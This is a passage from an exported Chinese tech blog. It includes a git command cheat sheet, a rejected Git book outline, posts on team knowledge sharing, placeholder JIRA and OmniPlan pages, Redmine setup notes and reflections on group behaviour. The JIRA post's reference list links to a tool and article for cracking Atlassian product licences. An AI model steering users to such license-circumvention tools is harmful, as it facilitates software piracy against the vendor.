<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示 file 在 HEAD 中的 SHA1 值</span></span><br><span class="line">git ls-tree HEAD file</span><br><span class="line"><span class="comment"># 显示一个 SHA1 的类型</span></span><br><span class="line">git cat-file -t SHA1</span><br><span class="line"><span class="comment"># 显示一个 SHA1 的内容</span></span><br><span class="line">git cat-file type SHA1</span><br><span class="line"></span><br><span class="line"><span class="comment">## diff</span></span><br><span class="line">git diff tag 比较tag和HEAD之间的不同</span><br><span class="line">git diff tag file 比较一个文件在两者之间的不同</span><br><span class="line">git diff tag1..tag2 比较两个tag之间的不同</span><br><span class="line">git diff SHA11..SHA12 比较两个提交之间的不同</span><br><span class="line">git diff tag1 tag2 file <span class="keyword">or</span></span><br><span class="line">git diff tag1:file tag2:file 比较一个文件在两个tag之间的不同</span><br><span class="line"></span><br><span class="line"><span class="comment">## log</span></span><br><span class="line">git <span class="keyword">log</span> file 查看一个文件的改动</span><br><span class="line">git <span class="keyword">log</span> -p 查看日志和改动</span><br><span class="line">git <span class="keyword">log</span> tag1..tag2 查看两个tag之间的日志</span><br><span class="line">git <span class="keyword">log</span> -p tag1..tag2 file 查看一个文件在两个tag之间的不同</span><br><span class="line">git <span class="keyword">log</span> tag.. 查看tag和HEAD之间的不同</span><br><span class="line"></span><br><span class="line"><span class="comment">## add/delete/ls:</span></span><br><span class="line">git add -a 添加所有文件(除了.gitignore)</span><br><span class="line">git rm file 从git仓库中删除文件</span><br><span class="line">git commit 添加或是删除后要提交</span><br><span class="line">git ls-files -m 显示修改过的文件</span><br><span class="line">git ls-files 显示所有仓库中的文件</span><br><span class="line"></span><br><span class="line"><span class="comment">## commit</span></span><br><span class="line">git commit -a -e 提交全部修改文件，并调用vim编辑提交日志</span><br><span class="line">git <span class="keyword">reset</span> HEAD^ <span class="keyword">or</span></span><br><span class="line">git <span class="keyword">reset</span> HEAD~<span class="number">1</span> 撤销最后一次提交。</span><br><span class="line">git <span class="keyword">reset</span> --hard HEAD^ 撤销最后一次提交并清除本地修改</span><br><span class="line">git <span class="keyword">reset</span> SHA1 回到SHA1对应的提交状态。</span><br><span class="line"></span><br><span class="line"><span class="comment">## patch:</span></span><br><span class="line">git <span class="keyword">format</span>-patch -<span class="number">1</span> 生成最后一个提交对应的patch文件。</span><br><span class="line">git am &lt; patch 把一个patch文件加入git仓库中。</span><br><span class="line">git am --resolved 如果有冲突，在解决冲突后执行。</span><br><span class="line">git am --skip 放弃当前git am所引入的patch。</span><br><span class="line"></span><br><span class="line"><span class="comment">## conflict:</span></span><br><span class="line">git merge 用于合并两个分支。</span><br><span class="line">git diff 如果有冲突，直接使用diff查看，</span><br><span class="line">冲突代码用&lt;&lt;&lt;和&gt;&gt;&gt;表示。手动修改冲突代码。</span><br><span class="line">git update-<span class="keyword">index</span> 更新修改后的文件状态。</span><br><span class="line">git commit -a -e 提交为解决冲突而修改的代码。</span><br><span class="line"></span><br><span class="line"><span class="comment">## branch:</span></span><br><span class="line">git branch -a 查看所有分支。</span><br><span class="line">git branch new_branch 创建新的分支。</span><br><span class="line">git branch -d branch 删除分支。</span><br><span class="line">git checkout branch 切换当前分支。-f参数可以覆盖未提交内容。</span><br></pre></td></tr></table></figure>
<h2 id="技术出版选题一：Git"><a href="#技术出版选题一：Git" class="headerlink" title="技术出版选题一：Git"></a>技术出版选题一：Git</h2><p>主要思路：技术、工程实践、文化心理三者关系<br>1.工具需要和工程实践结合，本身存在不同的应用范式<br>2.每一种技术实现背后，除了操作手册，还有必要了解背后发明者的故事，<br>   发明者的动机、哲学观会深入影响到技术实现。<br>3.一项技术能够落地，还需要与自己所在组织的文化、心理契合</p>
<p><strong>结果：电子工业出版社：2016 选题阶段枪毙</strong></p>
<h2 id="第一部分-玩转Git"><a href="#第一部分-玩转Git" class="headerlink" title="第一部分 玩转Git"></a>第一部分 玩转Git</h2><ul>
<li><p>引子1：如何搭建一个免费的博客？<br>（类似：<a href="http://www.jianshu.com/p/fd878edb95e7">http://www.jianshu.com/p/fd878edb95e7</a> ）<br>普遍性需求－&gt;抛出问题(内容版本、不仅仅是用于代码管理，建构个人知识库)</p>
</li>
<li><p>引子2：引入开源框架遇到问题怎么办？<br>内容： <a href="http://www.jianshu.com/p/8addb7d0024f">http://www.jianshu.com/p/8addb7d0024f</a><br>（开源社区的正确打开方式）</p>
</li>
<li><p>第2章 开启Git之旅</p>
</li>
<li><p>2.1 Git生态简介<br>谁发明？ 谁在用？</p>
</li>
<li><p>2.2 10分钟安装指南<br>Install、First Commit、First Push<br>部分回答引子的问题</p>
</li>
<li><p>2.4 Git客户端工具集</p>
</li>
<li><p>2.5 Git服务端工具集</p>
</li>
</ul>
<h4 id="第二部分-源码解读"><a href="#第二部分-源码解读" class="headerlink" title="第二部分 源码解读"></a>第二部分 源码解读</h4><ul>
<li>第3章 数据结构</li>
<li>3.1 文件</li>
<li>3.2 库</li>
<li>3.3 分支</li>
<li><p>3.2 标签</p>
</li>
<li><p>第4章 核心动作</p>
</li>
<li>4.1 add</li>
<li>4.2 commit</li>
<li>4.3 push</li>
<li><p>4.4 merge （调用关系）</p>
</li>
<li><p>第5章 从0到1: Git源码演进</p>
</li>
<li>5.1 第一版Git什么样</li>
</ul>
<h4 id="第三部分-工程应用"><a href="#第三部分-工程应用" class="headerlink" title="第三部分 工程应用"></a>第三部分 工程应用</h4><ul>
<li>第6章 到底要不要使用分支？</li>
<li>6.1 个人开发者范式（最简单的入门应用范式）</li>
<li>6.2 单一产品团队范式</li>
<li>6.3 开源社区范式：以Linux开发模式为例</li>
<li><p>6.4 多项目团队范式</p>
</li>
<li><p>第7章 到底要不要分库？</p>
</li>
<li>7.1 分库的一般原则</li>
<li><p>7.2 极客模式（参考资料：Google所有代码都在一个库）</p>
</li>
<li><p>第8章 权限控制问题<br>企业应用的突出问题： Git为什么不支持代码分权分域？<br>发明者：自由软件原教旨主义 &amp; 开源社区<br>了解冲突、选型过程、企业适配</p>
</li>
</ul>
<h4 id="第四部分-附录"><a href="#第四部分-附录" class="headerlink" title="第四部分 附录"></a>第四部分 附录</h4><p><a href="http://www.jianshu.com/p/841862adb059">《Linus Torvalds TED访谈实录：Linux和Git的故事》</a></p>
<p>（为什么会有Git,Git与Linux的渊源）</p>
<h4 id="Git源码解读"><a href="#Git源码解读" class="headerlink" title="Git源码解读"></a>Git源码解读</h4><ul>
<li><p>Git data model</p>
</li>
<li><p>Repository</p>
</li>
<li>Branch</li>
<li>Merge</li>
<li>Collaborate</li>
</ul>
<p>可选论题：Git为什么不支持代码分权分域：作者是自由软件原教旨主义者；源于Linux开发模式</p>
<h2 id="竞品分析"><a href="#竞品分析" class="headerlink" title="竞品分析"></a>竞品分析</h2><ul>
<li><a href="http://www.ituring.com.cn/book/1779?mc_cid=1b81b758f0&amp;mc_eid=b24726accf">《Git团队协作》</a></li>
</ul>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git pull origin master</span><br><span class="line">From github.com:riboseyim/go-hello</span><br><span class="line"> * branch            master     -&gt; FETCH_HEAD</span><br><span class="line">fatal: refusing to merge unrelated histories</span><br><span class="line">$ git pull origin master --allow-unrelated-histories</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读：DevOps-漫谈系列"><a href="#扩展阅读：DevOps-漫谈系列" class="headerlink" title="扩展阅读：DevOps 漫谈系列"></a>扩展阅读：<a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zwischenzugs.com/2018/03/26/git-log-the-good-parts/">git log – the Good Parts</a></li>
<li><a href="http://blog.codingnow.com/2017/04/git.html">为什么美术和策划在使用 git 时会遇到更多麻烦 | 云风的BlOG</a></li>
<li><a href="https://www.sbf5.com/~cduan/technical/git/">《Understanding Git Conceptually》</a></li>
<li><a href="http://www.open-open.com/lib/view/open1328070620202.html#articleHeader5">Git内部原理</a></li>
<li><a href="http://schacon.github.io/">Git作者之一Scott Chacon的站点</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MTY5NTk4Ng==&amp;mid=2247489377&amp;idx=1&amp;sn=c6f2101b46bb8534746cb9ae05a4b35f&amp;source=41#wechat_redirect">(企业实践，包含代码治理有关内容)Python向来以慢著称，为啥Instagram却唯独钟爱它？</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>The Road To Leader：构建知识共享型团队</title>
    <url>/2017/06/27/TeamWork-Knowledge-Sharing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一些有趣的知识分享圈子</li>
<li>推荐一些有趣的的电子书</li>
</ul>
<span id="more"></span>
<h2 id="知识分享圈子"><a href="#知识分享圈子" class="headerlink" title="知识分享圈子"></a>知识分享圈子</h2><ul>
<li><p>知识星球|睿哥读书会（年费制）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-rui-small.png" alt="知识星球|睿哥读书会"></p>
</li>
<li><p>知识星球|系统运维专家（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-devops-small.png" alt="知识星球|系统运维专家"></p>
</li>
<li><p>知识星球|Machine Learning 小组（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-machinelearning-small.png" alt="知识星球|Machine Learning 小组"></p>
</li>
<li><p>知识星球|经济学人翻译社（免费加入）<br><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-economist-small.png" alt="知识星球|经济学人翻译社"></p>
</li>
</ul>
<h4 id="我的电子书列表"><a href="#我的电子书列表" class="headerlink" title="我的电子书列表"></a>我的电子书列表</h4><ul>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master">《The Linux Perf Master| 操作系统性能专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master | 网络安全专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/ebook-data-visualization-master">《The Data Visualization Master | 数据可视化专家》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master | 机器学习专家》</a></li>
</ul>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="CoffeeDeveloper-你为什么不分享"><a href="#CoffeeDeveloper-你为什么不分享" class="headerlink" title="CoffeeDeveloper | 你为什么不分享"></a><a href="https://mp.weixin.qq.com/s/tSgEut_dYWMTL0eBGUAeCA">CoffeeDeveloper | 你为什么不分享</a></h4><p>多写，是有讲究的。特别是对于技术类的文章来说，为什么？因为技术文章是有套路或者说模板可循的。<br>例如：介绍一个新技术</p>
<ul>
<li>介绍技术名称和大概作用</li>
<li>抛出一个常见的问题</li>
<li>以往的技术是如何解决的</li>
<li>新技术是如何解决的</li>
<li>新技术在解决方案上对比旧技术的优势</li>
<li>新技术存在的问题与不足</li>
<li>展望新技术的发展和提出更多的应用场景</li>
<li>有条件的还可以提供性能测试结果等等，加强说服力</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://finland.fi/zh/shenghuoyushehui/reaiyuedudefenlanren/">热爱阅读的芬兰人</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/53572147">赵亚:我为什么坚持这么多年写博客</a></li>
<li><a href="https://dotblogs.com.tw/hatelove/2017/03/26/why-engineers-should-keep-blogging">Joey Chen:我为什么鼓励工程师写Blog</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MjM5MzA0ODkyMA==&amp;mid=211925813&amp;idx=2&amp;sn=0e9c817c4b3a8347e63a91f6ee97aa1f&amp;mpshare=1&amp;scene=1&amp;srcid=1102hLZpXjHA2L6390LtcYQD##">邱俊涛：技术人员如何写一本书</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目管理平台JIRA</title>
    <url>/2019/04/30/TeamWork-JIRA/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h4 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h4><h2 id="Introduction-XX简介"><a href="#Introduction-XX简介" class="headerlink" title="Introduction | XX简介"></a>Introduction | XX简介</h2><h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Overview"><a href="#Architecture-Overview" class="headerlink" title="Architecture Overview"></a>Architecture Overview</h2><h4 id="Files-Tree"><a href="#Files-Tree" class="headerlink" title="Files Tree"></a>Files Tree</h4><h2 id="Best-Practice-XX-最佳实践"><a href="#Best-Practice-XX-最佳实践" class="headerlink" title="Best Practice | XX 最佳实践"></a>Best Practice | XX 最佳实践</h2><h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/" target="_blank" rel="noopener">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://github.com/pengzhile/atlassian-agent" target="_blank" rel="noopener">Atlassian Agent</a></li>
<li><a href="https://zhile.io/2018/12/20/atlassian-license-crack.html" target="_blank" rel="noopener">Atlassian系列产品及插件激活方法|JIRA8.0</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目管理平台OmniPlan</title>
    <url>/2019/05/01/TeamWork-OmniPlan/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h4 id="网络规划技术"><a href="#网络规划技术" class="headerlink" title="网络规划技术"></a>网络规划技术</h4><h2 id="Introduction-XX简介"><a href="#Introduction-XX简介" class="headerlink" title="Introduction | XX简介"></a>Introduction | XX简介</h2><h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Overview"><a href="#Architecture-Overview" class="headerlink" title="Architecture Overview"></a>Architecture Overview</h2><h4 id="Files-Tree"><a href="#Files-Tree" class="headerlink" title="Files Tree"></a>Files Tree</h4><h2 id="Best-Practice-教程合辑"><a href="#Best-Practice-教程合辑" class="headerlink" title="Best Practice | 教程合辑"></a>Best Practice | 教程合辑</h2><ul>
<li><a href="https://support.omnigroup.com/doc-assets//OmniPlan-Mac/OmniPlan-Mac-v3.0.0.1/zh/EPUB/xhtml/03_tutorial.xhtml" target="_blank" rel="noopener">OmniPlan 3 官方教程 | 中文版</a></li>
<li><a href="http://www.zhichangxueshe.com/omniplanjiaocheng" target="_blank" rel="noopener">OmniPlan 教程 | 知常学社</a></li>
</ul>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/" target="_blank" rel="noopener">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:开源项目管理平台Redmine</title>
    <url>/2016/04/26/TeamWork-Redmine/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote>
<p>不管别人如何干扰，如何制造事端，最优秀的将领总是能达到预期的木笔而不会受制于作战计划。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227）</p>
</blockquote>
<span id="more"></span>
<h2 id="Redmine"><a href="#Redmine" class="headerlink" title="Redmine"></a>Redmine</h2><ul>
<li><a href="http://www.jianshu.com/p/cd7a12fa09bb">基于Redmine的项目管理平台</a></li>
</ul>
<p>“过程有记录，责任可追踪”,开发、运营过程中需要持续关注的基础信息，都可以通过统一平台沉淀、分析和改进优化。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gantt@2x.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/workflow_example@2x.png" alt=""></p>
<!--![基于Redmine数据定制开发](http://riboseyim-qiniu.riboseyim.com/theme_redmine_myindex.png)-->
<h2 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h2><h4 id="Install-Redmine"><a href="#Install-Redmine" class="headerlink" title="Install Redmine"></a>Install Redmine</h4><p><a href="http://bitnami.com">BitName</a> 提供了一个包含 Ruby、RAILS、MySQL、Apache 等依赖的集成安装包。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.解压</span></span><br><span class="line">~/redmine-1.2.1-1/apps/redmine/vender/plugins</span><br><span class="line">$ <span class="built_in">cd</span> redmine-1.2.1-1</span><br><span class="line"><span class="comment"># 2.安装</span></span><br><span class="line">$ ./use_redmine</span><br><span class="line"><span class="comment"># 3.配置</span></span><br><span class="line">$ <span class="built_in">cd</span> apps/redmine/vender/pluginsrake</span><br><span class="line">$ db:migrate_plugins RAILS_ENV=production</span><br></pre></td></tr></table></figure>
<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><img src="https://upload-images.jianshu.io/upload_images/1037849-f81e70d040cb7850.jpg" alt=""></p>
<h2 id="Kanban"><a href="#Kanban" class="headerlink" title="Kanban"></a>Kanban</h2><ul>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">Kanban看板管理实践精要</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Kanban_Pattern_DevOps.png" alt=""></p>
<p><img src="https://static001.infoq.cn/resource/image/93/8b/93cc49843b45dd772627527c8423228b.png" alt=""></p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://agiledon.github.com/blog/2014/08/09/visualize-design-workshop/">张逸：可视化设计工作坊</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>如果快速构建一个知识体系：以中情局的 WorldBook 为例</title>
    <url>/2017/05/03/TeamWork-WorldBook/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.cia.gov/library/publications/resources/the-world-factbook/geos/ch.html" target="_blank" rel="noopener">CIA：The World Facbook</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>组织论:群体行为模式</title>
    <url>/2016/06/15/TeamWork/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>群体智慧</li>
<li>瘾品</li>
<li>项目管理工具</li>
</ul>
<span id="more"></span>
<h2 id="一些不成熟的构思"><a href="#一些不成熟的构思" class="headerlink" title="一些不成熟的构思"></a>一些不成熟的构思</h2><ol>
<li>团队重建中的心理问题</li>
<li>外科手术模式</li>
<li>交响乐队模式</li>
<li>协作与保密</li>
</ol>
<h4 id="协作与保密"><a href="#协作与保密" class="headerlink" title="协作与保密"></a>协作与保密</h4><blockquote>
<p>因为我们希望这两个部门在这么机密的事情上不要通气。你只需要告诉他们如何安全地保管这些化学品就可以了。”我说，在我看来，如果他们不知道这些原理，他们就不可能理解并遵守那一大堆规则，除非他们知道这其中的原理。所以我的观点是，我必须告诉他们原理，否则洛斯阿拉莫斯不对橡树岭的安全负责！— 理查德·费曼 《发现的乐趣》</p>
</blockquote>
<h2 id="群体智慧"><a href="#群体智慧" class="headerlink" title="群体智慧"></a>群体智慧</h2><blockquote>
<p>保持群体智慧的唯一方式是保护每个人的独立性。—乔纳-莱勒（Jonah Lehrer）</p>
</blockquote>
<p>群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。<strong>群体智慧依赖于多样性和独立性</strong>。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），<strong>同事压力和主导人物可能会降低该团体的智慧</strong>。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏），P308）</p>
<h2 id="人类认知与行为模式"><a href="#人类认知与行为模式" class="headerlink" title="人类认知与行为模式"></a>人类认知与行为模式</h2><h4 id="嗑药简史：关于瘾品，成瘾机制及其历史"><a href="#嗑药简史：关于瘾品，成瘾机制及其历史" class="headerlink" title="嗑药简史：关于瘾品，成瘾机制及其历史"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史：关于瘾品，成瘾机制及其历史</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、性行为、运动、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
<li><p>瘾品的管制思路变迁：禁令还是放纵？</p>
</li>
<li><p><a href="https://book.douban.com/subject/25908552/">《上瘾五百年: 烟、酒、咖啡和鸦片的历史》|戴维·考特莱特</a></p>
</li>
</ul>
<blockquote>
<p>综合了心理、药物、经济、文化、生态等领域的研究，详细介绍所有能让人类成瘾的物品，以及瘾品背后的经济、文化和战争。瘾品在历史上的力量有多大？它们为何有合法与违禁之分？是什么力量将瘾品的流行推动为规模庞大、模式各异的商品贸易？作者从瘾品的功能用途到它们的发现，到全球贸易的流通和经济政策，全面介绍精神瘾品的文化，追踪出大众化瘾品进入全球贸易主流的来龙去脉，内容有趣，视野广博，令人眼界大开。毫无疑问，它是一本关于瘾品文化史的经典著作，也是一本横跨世界史与药物史的杰作。</p>
</blockquote>
<h2 id="项目管理工具"><a href="#项目管理工具" class="headerlink" title="项目管理工具"></a><a href="https://riboseyim.github.io/2016/04/26/TeamWork-Redmine/">项目管理工具</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
